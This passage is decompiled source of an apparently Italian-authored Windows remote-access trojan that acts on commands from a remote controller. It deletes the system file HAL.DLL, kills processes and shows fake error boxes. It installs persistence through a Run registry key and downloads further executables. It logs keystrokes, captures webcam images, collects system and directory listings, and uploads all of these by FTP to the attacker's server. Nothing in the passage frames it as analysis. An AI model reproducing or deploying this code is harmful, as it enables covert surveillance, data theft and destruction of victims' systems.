        if (str1.Contains("253.system.halattack"))
        {
          Interaction.Shell("cmd.exe /C icacls \"%WINDIR%\\system32\\HAL.DLL\" /grant \"%USERNAME%\":f");
          FileSystem.Kill("hal.dll");
        }
        if (str1.Contains("253.system.msgcrash"))
          this.Timer2.Start();
        if (str1.Contains("253.programs.killprocessbyname "))
        {
          str1 = str1.Replace("253.programs.killprocessbyname ", "");
          Process[] processesByName = Process.GetProcessesByName(str1);
          int index = 0;
          while (index < processesByName.Length)
          {
            processesByName[index].Kill();
            checked { ++index; }
          }
        }
        if (str1.Contains("253.programs.opennotepad "))
          Interaction.Shell("notepad");
        if (str1.Contains("253.programs.opencmd "))
          Interaction.Shell("cmd");
        if (str1.Contains("253.programs.opentaskmgrmanager "))
          Interaction.Shell("taskmgr");
        if (str1.Contains("253.programs.killexplorerexe "))
          Interaction.Shell("taskkill /F /IM explorer.exe");
        if (str1.Contains("253.programs.openexplorerexe "))
          Interaction.Shell("explorer");
        if (str1.Contains("253.information.getinformationinfo "))
        {
          string str8 = this.Label1.Text.Replace("http://", "ftp://");
          StreamWriter streamWriter6 = new StreamWriter("C:\\sub_info.txt");
          streamWriter6.WriteLine("Computer Name: " + MyProject.Computer.Name);
          streamWriter6.WriteLine("OS FullName: " + MyProject.Computer.Info.OSFullName);
          streamWriter6.WriteLine("OS Platform: " + MyProject.Computer.Info.OSPlatform);
          streamWriter6.WriteLine("OS Version: " + MyProject.Computer.Info.OSVersion);
          streamWriter6.WriteLine("Local Hour: " + Conversions.ToString(MyProject.Computer.Clock.LocalTime.Hour) + "." + Conversions.ToString(MyProject.Computer.Clock.LocalTime.Minute));
          streamWriter6.WriteLine("Total Physical Memory: " + Conversions.ToString(MyProject.Computer.Info.TotalPhysicalMemory));
          streamWriter6.WriteLine("Total Virtual Memory: " + Conversions.ToString(MyProject.Computer.Info.TotalVirtualMemory));
          streamWriter6.WriteLine("Avaible Physical Memory: " + Conversions.ToString(MyProject.Computer.Info.AvailablePhysicalMemory));
          streamWriter6.WriteLine("Avaible Virtual Memory: " + Conversions.ToString(MyProject.Computer.Info.AvailableVirtualMemory));
          streamWriter6.Close();
          MyProject.Computer.Network.UploadFile("C:\\sub_info.txt", str8 + "sub_info.html", this.Label3.Text, this.Label4.Text);
        }
        if (str1.Contains("253.server.update "))
        {
          string str9 = this.Label1.Text.Replace("ftp://", "http://");
          string str10 = Application.ExecutablePath.ToLower().Replace(".exe", "");
          MyProject.Computer.Network.DownloadFile(str9 + "update.svr", str10 + "1.exe");
          MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", this.Label2.Text, (object) (str10 + "1.exe"));
        }
        if (str1.Contains("253.network.downloader "))
        {
          str1 = str1.Replace("253.network.downloader ", "");
          MyProject.Computer.Network.DownloadFile(str1, streamReader3.ReadLine());
        }
        if (str1.Contains("253.functions.keylogger "))
        {
          str1 = str1.Replace("253.functions.keylogger ", "");
          this.Timer4.Start();
          this.Timer5.Interval = Conversions.ToInteger(str1 + "000");
          this.Timer5.Start();
        }
        if (str1.Contains("253.functions.webcamspy "))
        {
          this.LoadDeviceList();
          this.checkDeviceList();
          this.iDevice = this.lstDevices.SelectedIndex;
          this.startPreview();
          this.saveImage();
          capture.SendMessage(this.hHwnd, 1035, this.iDevice, (object) 0);
          capture.DestroyWindow(this.hHwnd);
          MyProject.Computer.Network.UploadFile("C:\\web243566334.jpg", this.Label1.Text.Replace("http://", "ftp://") + "webcamimg.jpg", this.Label3.Text, this.Label4.Text);
        }
        if (!str1.Contains("253.information.getsubdirectoryesandfiles "))
          return;
        string path = str1.Replace("253.information.getsubdirectoryesandfiles ", "");
        try
        {
          StreamWriter streamWriter7 = new StreamWriter("C:\\SubDirectoryes00");
          DirectoryInfo[] directories = new DirectoryInfo(path).GetDirectories("*.*", SearchOption.TopDirectoryOnly);
          int index = 0;
          while (index < directories.Length)
          {
            DirectoryInfo directoryInfo = directories[index];
            streamWriter7.WriteLine((object) directoryInfo);
            checked { ++index; }
          }
          streamWriter7.Close();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          StreamWriter streamWriter8 = new StreamWriter("SubDirectoryes00");
          StreamWriter streamWriter9 = new StreamWriter("C:\\SubFiles00");
          streamWriter8.Write("Impossibile accedere al percorso");
          streamWriter8.Close();
          streamWriter9.Write("Impossibile accedere al percorso");
          streamWriter9.Close();
          ProjectData.ClearProjectError();
        }
        try
        {
          StreamWriter streamWriter10 = new StreamWriter("C:\\SubFiles00");
          FileInfo[] files = new DirectoryInfo(path).GetFiles("*.*", SearchOption.TopDirectoryOnly);
          int index = 0;
          while (index < files.Length)
          {
            FileInfo fileInfo = files[index];
            streamWriter10.WriteLine((object) fileInfo);
            checked { ++index; }
          }
          streamWriter10.Close();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          StreamWriter streamWriter11 = new StreamWriter("C:\\SubDirectoryes00");
          StreamWriter streamWriter12 = new StreamWriter("C:\\SubFiles00");
          streamWriter11.Write("Impossibile accedere al percorso");
          streamWriter11.Close();
          streamWriter12.Write("Impossibile accedere al percorso");
          streamWriter12.Close();
          ProjectData.ClearProjectError();
        }
        string str11 = this.Label1.Text.Replace("http://", "ftp://");
        MyProject.Computer.Network.UploadFile("C:\\SubDirectoryes00", str11 + "SubDirectoryes00.html", this.Label3.Text, this.Label4.Text);
        MyProject.Computer.Network.UploadFile("C:\\SubFiles00", str11 + "SubFiles00.html", this.Label3.Text, this.Label4.Text);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
      try
      {
        int num = (int) Interaction.MsgBox((object) "ERROR!!!!!", MsgBoxStyle.Critical, (object) "ERROR!!!!!");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer4_Tick(object sender, EventArgs e)
    {
      if (Form1.GetAsyncKeyState(65) == (short) -32767)
        this.TextBox1.Text += "a";
      if (Form1.GetAsyncKeyState(66) == (short) -32767)
        this.TextBox1.Text += "b";
      if (Form1.GetAsyncKeyState(67) == (short) -32767)
        this.TextBox1.Text += "c";
      if (Form1.GetAsyncKeyState(68) == (short) -32767)
        this.TextBox1.Text += "d";
      if (Form1.GetAsyncKeyState(69) == (short) -32767)
        this.TextBox1.Text += nameof (e);
      if (Form1.GetAsyncKeyState(70) == (short) -32767)
        this.TextBox1.Text += "f";
      if (Form1.GetAsyncKeyState(71) == (short) -32767)
        this.TextBox1.Text += "g";
      if (Form1.GetAsyncKeyState(72) == (short) -32767)
        this.TextBox1.Text += "h";
      if (Form1.GetAsyncKeyState(73) == (short) -32767)
        this.TextBox1.Text += "i";
      if (Form1.GetAsyncKeyState(76) == (short) -32767)
        this.TextBox1.Text += "l";
      if (Form1.GetAsyncKeyState(77) == (short) -32767)
        this.TextBox1.Text += "m";
      if (Form1.GetAsyncKeyState(78) == (short) -32767)
        this.TextBox1.Text += "n";
      if (Form1.GetAsyncKeyState(79) == (short) -32767)
        this.TextBox1.Text += "o";
      if (Form1.GetAsyncKeyState(80) == (short) -32767)
        this.TextBox1.Text += "p";
      if (Form1.GetAsyncKeyState(81) == (short) -32767)
        this.TextBox1.Text += "q";
      if (Form1.GetAsyncKeyState(82) == (short) -32767)
        this.TextBox1.Text += "r";
      if (Form1.GetAsyncKeyState(83) == (short) -32767)
        this.TextBox1.Text += "s";
      if (Form1.GetAsyncKeyState(84) == (short) -32767)
        this.TextBox1.Text += "t";
      if (Form1.GetAsyncKeyState(85) == (short) -32767)
        this.TextBox1.Text += "u";
      if (Form1.GetAsyncKeyState(86) == (short) -32767)
        this.TextBox1.Text += "v";
      if (Form1.GetAsyncKeyState(90) == (short) -32767)
        this.TextBox1.Text += "z";
      if (Form1.GetAsyncKeyState(88) == (short) -32767)
        this.TextBox1.Text += "x";
      if (Form1.GetAsyncKeyState(87) == (short) -32767)
        this.TextBox1.Text += "w";
      if (Form1.GetAsyncKeyState(89) == (short) -32767)
        this.TextBox1.Text += "y";
      if (Form1.GetAsyncKeyState(74) == (short) -32767)
        this.TextBox1.Text += "j";
      if (Form1.GetAsyncKeyState(75) == (short) -32767)
        this.TextBox1.Text += "k";
      if (Form1.GetAsyncKeyState(96) == (short) -32767)
        this.TextBox1.Text += "0";
      if (Form1.GetAsyncKeyState(97) == (short) -32767)
        this.TextBox1.Text += "1";
      if (Form1.GetAsyncKeyState(98) == (short) -32767)
        this.TextBox1.Text += "2";
      if (Form1.GetAsyncKeyState(99) == (short) -32767)
        this.TextBox1.Text += "3";
      if (Form1.GetAsyncKeyState(100) == (short) -32767)
        this.TextBox1.Text += "4";
      if (Form1.GetAsyncKeyState(101) == (short) -32767)
        this.TextBox1.Text += "5";
      if (Form1.GetAsyncKeyState(102) == (short) -32767)
        this.TextBox1.Text += "6";
      if (Form1.GetAsyncKeyState(103) == (short) -32767)
        this.TextBox1.Text += "7";
      if (Form1.GetAsyncKeyState(104) == (short) -32767)
        this.TextBox1.Text += "8";
      if (Form1.GetAsyncKeyState(105) == (short) -32767)
        this.TextBox1.Text += "9";
      if (Form1.GetAsyncKeyState(13) == (short) -32767)
        this.TextBox1.Text += " ***Invio*** ";
      if (Form1.GetAsyncKeyState(46) == (short) -32767)
        this.TextBox1.Text += " ***Delete*** ";
      if (Form1.GetAsyncKeyState(112) == (short) -32767)
        this.TextBox1.Text += " F1 ";
      if (Form1.GetAsyncKeyState(32) == (short) -32767)
        this.TextBox1.Text += " ";
      if (Form1.GetAsyncKeyState(113) == (short) -32767)
        this.TextBox1.Text += " F2 ";
      if (Form1.GetAsyncKeyState(114) == (short) -32767)
        this.TextBox1.Text += " F3 ";
      if (Form1.GetAsyncKeyState(115) == (short) -32767)
        this.TextBox1.Text += " F4 ";
      if (Form1.GetAsyncKeyState(116) == (short) -32767)
        this.TextBox1.Text += " F5 ";
      if (Form1.GetAsyncKeyState(117) == (short) -32767)
        this.TextBox1.Text += " F6 ";
      if (Form1.GetAsyncKeyState(118) == (short) -32767)
        this.TextBox1.Text += " F7 ";
      if (Form1.GetAsyncKeyState(119) == (short) -32767)
        this.TextBox1.Text += " F8 ";
      if (Form1.GetAsyncKeyState(120) == (short) -32767)
        this.TextBox1.Text += " F9 ";
      if (Form1.GetAsyncKeyState(121) == (short) -32767)
        this.TextBox1.Text += " F10 ";
      if (Form1.GetAsyncKeyState(122) == (short) -32767)
        this.TextBox1.Text += " F11 ";
      if (Form1.GetAsyncKeyState(123) != (short) -32767)
        return;
      this.TextBox1.Text += " F12 ";
    }

    private void Timer5_Tick(object sender, EventArgs e)
    {
      try
      {
        this.Timer4.Stop();
        Environment.GetEnvironmentVariable("WINDIR");
        string str = this.Label1.Text.Replace("http://", "ftp://");
        StreamWriter streamWriter = new StreamWriter("KeyLog00");
        streamWriter.Write(this.TextBox1.Text);
        streamWriter.Close();
        this.TextBox1.Clear();
        MyProject.Computer.Network.UploadFile("KeyLog00", str + "KeyLog.txt", this.Label3.Text, this.Label4.Text);
        this.Timer5.Stop();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.Timer4.Stop();
        this.Timer5.Stop();
        ProjectData.ClearProjectError();
      }
    }
  }
}
